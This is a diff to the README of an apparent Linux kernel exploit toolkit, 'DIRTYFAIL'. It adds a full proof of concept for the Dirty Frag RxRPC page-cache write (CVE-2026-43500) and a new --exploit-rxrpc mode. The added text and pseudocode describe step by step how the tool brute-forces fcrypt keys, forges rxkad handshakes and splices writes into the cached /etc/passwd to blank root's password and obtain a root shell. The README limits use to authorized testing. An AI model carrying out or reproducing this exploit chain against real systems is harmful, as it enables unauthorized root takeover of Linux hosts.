@@ -22,7 +22,7 @@ vulnerable system.
 |-----|------|--------------------|
 | **CVE-2026-31431** | Copy Fail (algif_aead `authencesn` page-cache write) | Detect + full PoC |
 | **CVE-2026-43284** | Dirty Frag — xfrm-ESP page-cache write              | Detect + full PoC |
-| **CVE-2026-43500** | Dirty Frag — RxRPC page-cache write                 | Detect only       |
+| **CVE-2026-43500** | Dirty Frag — RxRPC page-cache write                 | Detect + full PoC |
 
 > **Authorized testing only.** Use DIRTYFAIL only on systems you own or
 > are explicitly engaged to assess. The exploit modes corrupt
@@ -270,14 +270,45 @@ The full exploit:
 
 ### DIRTYFAIL coverage
 
-DIRTYFAIL **detects** this CVE (kernel version + rxrpc availability +
-AF_RXRPC openable) but does **not** ship a full PoC. Reimplementing
-the fcrypt brute-force, the AF_RXRPC handshake forgery, and the rxkad
-checksum derivation cleanly from scratch is on the order of 800 lines
-on top of what is already public.
+DIRTYFAIL ships **both** detection and a full PoC for this CVE.
 
-For end-to-end exploitation testing, run V4bel's `exp.c` on a
-sandboxed VM: <https://github.com/V4bel/dirtyfrag>.
+The DIRTYFAIL implementation lives in `src/dirtyfrag_rxrpc.c` and
+`src/fcrypt.c`:
+
+- **fcrypt cipher** (`fcrypt.c`): 56-bit key, 8-byte block, 16-round
+  Feistel; standard rxkad protocol S-boxes. Includes a single-core
+  brute-force harness (~18 Mops/s) that searches the key space until
+  a candidate plaintext satisfies a caller-supplied predicate.
+- **rxkad checksum** (`compute_csum_iv`, `compute_cksum`): kernel
+  formula reproduced via AF_ALG `pcbc(fcrypt)` so that the wire cksum
+  in our forged DATA packet passes `rxkad_verify_packet`'s gate.
+- **RxRPC v1 token build** (`build_rxrpc_v1_token`): XDR-encoded
+  rxkad token registered via `add_key("rxrpc", ...)` with our
+  brute-forced session key.
+- **AF_RXRPC client + UDP fake-server**: the client initiates a call,
+  the fake-server extracts (epoch, cid, callNumber) from the first
+  packet and emits a forged CHALLENGE so the client primes
+  `conn->rxkad.cipher` with our key.
+- **Splice trigger** (`do_one_trigger`): vmsplice forged DATA wire
+  header → splice 8 bytes from `/etc/passwd` → splice pipe → udp_srv
+  → recvmsg drives kernel through `rxkad_verify_packet_1` → 8-byte
+  STORE.
+- **3-splice chain with chained-ciphertext correction**: brute force
+  K_A / K_B / K_C, applying the chained ciphertext shift between
+  passes (after splice A overwrites bytes 4..11, splice B's
+  ciphertext at 6..13 starts with `P_A[2..7]`; same for C against B).
+
+The final PoC reshapes `/etc/passwd` line 1 to:
+
+```
+root::0:0:GGGGG:/root:/bin/bash
+```
+
+— empty password field — and `execlp("su", "-")` then drops a root
+shell because `pam_unix.so nullok` accepts an empty password.
+
+For comparison and verification against the upstream PoC, see
+V4bel's `exp.c`: <https://github.com/V4bel/dirtyfrag>.
 
 ---
 
@@ -333,6 +364,8 @@ Modes (pick one; default is --scan):
   --check-rxrpc          Dirty Frag RxRPC   (CVE-2026-43500) detection only
   --exploit-copyfail     real PoC: flip /etc/passwd UID via algif_aead
   --exploit-esp          real PoC: flip /etc/passwd UID via xfrm-ESP
+  --exploit-rxrpc        real PoC: empty /etc/passwd root pwd via rxkad
+                         (fcrypt brute-force + AF_RXRPC handshake forgery)
   --cleanup              evict /etc/passwd from page cache and drop_caches
 
 Options:
@@ -495,9 +528,44 @@ Same end-state as Copy Fail, reached through `xfrm_input` instead of
 Then exit the namespace, `execlp("su", user)` from the parent — same
 final step as Copy Fail.
 
-### Dirty Frag RxRPC exploit
+### Dirty Frag RxRPC exploit (`dirtyfrag_rxrpc.c` + `fcrypt.c`)
 
-Out of scope for DIRTYFAIL. Use `V4bel/dirtyfrag::exp.c`.
+```
+                                          [/etc/passwd page cache]
+ user-space brute force of K_A, K_B, K_C such that fcrypt_decrypt(C, K)
+   produces predicate-satisfying plaintexts for offsets 4, 6, 8
+   (chained-ciphertext correction across passes)
+
+ fork → child enters new userns:
+   unshare(USER|NET); setup uid_map; ifup lo
+   socket(AF_RXRPC) — autoload rxrpc.ko
+   for each (off, K) in [(4,K_A), (6,K_B), (8,K_C)]:
+     add_key("rxrpc", "df-evil<n>", v1_token{session_key=K})
+     udp_srv = bind 127.0.0.1:port_S
+     rxsk    = AF_RXRPC + SECURITY_KEY=df-evil<n> + bind :port_C
+     rxsk → sendmsg(PINGPING)              triggers handshake init
+     udp_srv ← receives kernel's first DATA-0
+       extract (epoch, cid, callNumber)
+     udp_srv → forged CHALLENGE             → rxsk auto-RESPONSE
+                                               primes conn->rxkad.cipher with K
+     csum_iv = AF_ALG pcbc(fcrypt)(epoch||cid||0||sec_ix, IV=K)
+     cksum_h = AF_ALG pcbc(fcrypt)(call_id||x, IV=csum_iv)[1] >> 16
+     vmsplice DATA hdr (28B) → pipe
+     splice  /etc/passwd@off (8B) → pipe
+     splice  pipe (36B) → udp_srv
+     udp loopback → rxsk
+       recvmsg → rxrpc_input → rxkad_verify_packet
+         skb has frags, no frag_list → goto skip_unshare    (THE BUG)
+         skcipher_request_set_crypt(req, sg=page+off, sg=page+off, 8, iv=0)
+         crypto_skcipher_decrypt: pcbc(fcrypt)
+           page[off..off+8] = fcrypt_decrypt(C_actual, K)    ◄─ 8-byte STORE
+
+ child exits, parent verifies /etc/passwd[4..5] == "::"
+ parent: execlp("su", "-")
+   PAM common-auth: pam_unix.so nullok    → root has empty password
+   su  → setresuid(0,0,0) → exec /bin/bash
+                                       ─────► root shell
+```
 
 ---
 
